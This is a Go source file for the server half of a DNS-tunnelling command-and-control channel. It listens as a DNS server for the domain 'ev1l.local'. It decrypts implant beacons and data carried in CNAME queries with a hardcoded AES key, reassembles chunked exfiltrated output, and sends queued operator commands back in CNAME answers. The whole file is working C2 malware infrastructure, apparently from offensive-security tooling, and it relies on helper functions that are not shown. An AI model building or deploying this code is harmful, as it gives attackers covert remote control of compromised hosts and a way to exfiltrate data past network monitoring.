package main

import (
	"github.com/miekg/dns"
	"log"
	"strconv"
	"strings"
)

const ProxyDomain = "ev1l.local."
const AesKey = "0123456789abcdef"
const BindAddress = "127.0.0.1:53"

var RequestChannel = make(chan string)

type handler struct{}

var longOutput []string
var longOutputParts int

func handleOutput(encryptedPayload string) string {
	if strings.HasPrefix(encryptedPayload, "prt.") {
		encryptedParts := strings.Split(encryptedPayload, ".")
		currentPart, _ := strconv.Atoi(encryptedParts[1])
		longOutput = append(longOutput, encryptedParts[3])
		status := EncryptMessage([]byte(AesKey), "rcvLong"+strconv.Itoa(currentPart)+":"+strconv.Itoa(longOutputParts))

		if currentPart == longOutputParts-1 {
			output := strings.Join(longOutput, "")
			go func() {
				ResultChannel <- DecryptMessage([]byte(AesKey), output)
				//ResultChannel <- "[impl -> C2]   Decrypt(" + encryptedPayload + ") = " + message
			}()
			longOutputParts = 0
			longOutput = make([]string, 0)
		}

		return status
	}

	message := DecryptMessage([]byte(AesKey), encryptedPayload)

	go func() {
		ResultChannel <- message
		//ResultChannel <- "[impl -> C2]   Decrypt(" + encryptedPayload + ") = " + message
	}()

	if strings.HasPrefix(message, "sendLong_") {
		longOutputParts, _ = strconv.Atoi(strings.TrimPrefix(message, "sendLong_"))
		status := EncryptMessage([]byte(AesKey), "readyRcv")
		return status
	}

	if strings.HasPrefix(message, "initC2_") {
		status := EncryptMessage([]byte(AesKey), "init")
		return status
	}

	if strings.EqualFold(message, "beacon") {
		select {
		case x, ok := <-RequestChannel:
			if ok {
				command := EncryptMessage([]byte(AesKey), x)
				//ResultChannel <- "[C2 -> impl]   Encrypt(" + x + ") = " + command
				return command
			} else {

			}
		default:

		}

	}

	status := EncryptMessage([]byte(AesKey), "idle")
	return status
}

func (this *handler) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {
	msg := dns.Msg{}
	msg.SetReply(r)
	switch r.Question[0].Qtype {
	case dns.TypeCNAME:
		msg.Authoritative = true
		domain := msg.Question[0].Name
		ok := strings.HasSuffix(domain, ProxyDomain)
		if ok {
			var ans string
			if strings.HasPrefix(msg.Question[0].Name, "prt.") {
				ans = strings.TrimSuffix(msg.Question[0].Name, "."+ProxyDomain)
			} else {
				ans = strings.Split(msg.Question[0].Name, ".")[0]
			}
			ans = handleOutput(ans)
			msg.Answer = append(msg.Answer, &dns.CNAME{
				Hdr:    dns.RR_Header{Name: domain, Rrtype: dns.TypeCNAME, Class: dns.ClassINET, Ttl: 60},
				Target: ans + "." + ProxyDomain,
			})
		} else {
			msg.Answer = resolve(domain, msg.Question[0].Qtype)
		}

	case dns.TypeA:
		msg.Authoritative = true
		domain := msg.Question[0].Name
		msg.Answer = resolve(domain, msg.Question[0].Qtype)
	}

	w.WriteMsg(&msg)
}

func run() {
	srv := &dns.Server{Addr: BindAddress, Net: "udp"}
	srv.Handler = &handler{}
	if err := srv.ListenAndServe(); err != nil {
		log.Fatalf("Failed to set udp listener %s\n", err.Error())
	}
}
